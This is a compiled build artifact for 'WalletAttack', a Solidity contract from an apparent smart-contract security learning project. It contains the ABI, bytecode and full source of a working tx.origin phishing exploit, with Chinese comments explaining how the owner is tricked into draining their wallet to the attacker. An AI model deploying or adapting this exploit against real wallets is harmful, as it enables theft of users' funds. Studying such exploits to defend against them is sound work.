{
  "contractName": "WalletAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Wallet",
          "name": "_wallet",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "wallet",
      "outputs": [
        {
          "internalType": "contract Wallet",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161035938038061035983398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6102bd8061009c6000396000f3fe60806040526004361061004e5760003560e01c806312065fe01461005a5780633ccfd60b1461007a57806348eb76ee14610091578063521eb273146100c95780639e5faafc146100e957600080fd5b3661005557005b600080fd5b34801561006657600080fd5b506040514781526020015b60405180910390f35b34801561008657600080fd5b5061008f6100fe565b005b34801561009d57600080fd5b506001546100b1906001600160a01b031681565b6040516001600160a01b039091168152602001610071565b3480156100d557600080fd5b506000546100b1906001600160a01b031681565b3480156100f557600080fd5b5061008f610198565b6001546001600160a01b0316331461015c5760405162461bcd60e51b815260206004820152601a60248201527f4f6e6c792061747461636b65722063616e207769746864726177000000000000604482015260640160405180910390fd5b6001546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610195573d6000803e3d6000fd5b50565b60005460408051629032ff60e51b815290516001600160a01b039092169163a9059cbb91309184916312065fe09160048083019260209291908290030181865afa1580156101ea573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061020e919061026e565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401600060405180830381600087803b15801561025457600080fd5b505af1158015610268573d6000803e3d6000fd5b50505050565b60006020828403121561028057600080fd5b505191905056fea2646970667358221220499d4a637c562a2d51ceb30ed61d634d2810c14fdd5911a553b87630a0162a1c64736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\nimport \"./Wallet.sol\";\n\n/**\n * WalletAttack - tx.origin 攻击合约\n * \n * 攻击原理：\n * 利用 Alice 对 Wallet 的信任，通过中间合约发起攻击\n * \n * 攻击流程：\n * 1. Alice（钱包所有者）调用 WalletAttack.attack()\n * 2. WalletAttack 调用 Wallet.transfer(attackContract, allBalance)\n * 3. 在 Wallet.transfer() 中：\n *    - msg.sender = WalletAttack 合约地址\n *    - tx.origin = Alice（原始发起者）\n * 4. require(tx.origin == owner) 成立（Alice == Alice）\n * 5. 攻击成功，ETH 转到攻击合约\n */\ncontract WalletAttack {\n    Wallet public wallet;\n    address public attacker;\n    \n    constructor(Wallet _wallet) {\n        wallet = _wallet;\n        attacker = msg.sender;\n    }\n    \n    /**\n     * attack - 发起攻击\n     * \n     * 注意：调用这个函数的必须是钱包所有者\n     */\n    function attack() public {\n        // 转走钱包里所有的 ETH 到攻击合约\n        wallet.transfer(payable(address(this)), wallet.getBalance());\n    }\n    \n    /**\n     * withdraw - 从攻击合约提取资金到攻击者账户\n     */\n    function withdraw() public {\n        require(msg.sender == attacker, \"Only attacker can withdraw\");\n        payable(attacker).transfer(address(this).balance);\n    }\n    \n    /**\n     * 接收 ETH\n     */\n    receive() external payable {}\n    \n    /**\n     * 查看攻击合约余额\n     */\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}",
  "sourcePath": "C:\\Users\\ZhuanZ1\\Desktop\\smart-contract-security\\contracts\\WalletAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2026-04-24T17:04:26.781Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {
      "attack()": {
        "notice": "attack - 发起攻击  注意：调用这个函数的必须是钱包所有者"
      },
      "getBalance()": {
        "notice": "查看攻击合约余额"
      },
      "withdraw()": {
        "notice": "withdraw - 从攻击合约提取资金到攻击者账户"
      }
    },
    "notice": "WalletAttack - tx.origin 攻击合约  攻击原理： 利用 Alice 对 Wallet 的信任，通过中间合约发起攻击  攻击流程： 1. Alice（钱包所有者）调用 WalletAttack.attack() 2. WalletAttack 调用 Wallet.transfer(attackContract, allBalance) 3. 在 Wallet.transfer() 中：    - msg.sender = WalletAttack 合约地址    - tx.origin = Alice（原始发起者） 4. require(tx.origin == owner) 成立（Alice == Alice） 5. 攻击成功，ETH 转到攻击合约",
    "version": 1
  }
}